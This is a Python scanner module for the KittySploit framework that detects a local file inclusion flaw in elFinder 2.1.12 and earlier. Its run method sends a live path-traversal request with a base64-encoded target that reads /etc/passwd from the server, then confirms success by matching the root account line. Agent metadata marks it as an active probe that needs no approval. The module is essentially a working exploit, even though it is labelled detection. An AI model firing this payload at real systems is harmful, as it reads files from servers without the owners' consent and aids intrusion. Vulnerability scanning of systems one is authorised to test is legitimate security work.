#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""elFinder through 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'elFinder  <=2.1.12 - Local File Inclusion Detection',
        'description': 'elFinder through 2.1.12 is vulnerable to local file inclusion via Connector.minimal.php in std42. This allows unauthenticated remote attackers to read, write, and browse files outside the configured document root. This is due to improper handling of absolute file paths.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'lfi', 'elfinder', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html'],
    }

    def run(self):
        path = '/php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='elFinder  <=2.1.12 - Local File Inclusion detected', path=path)
            return True
        return False

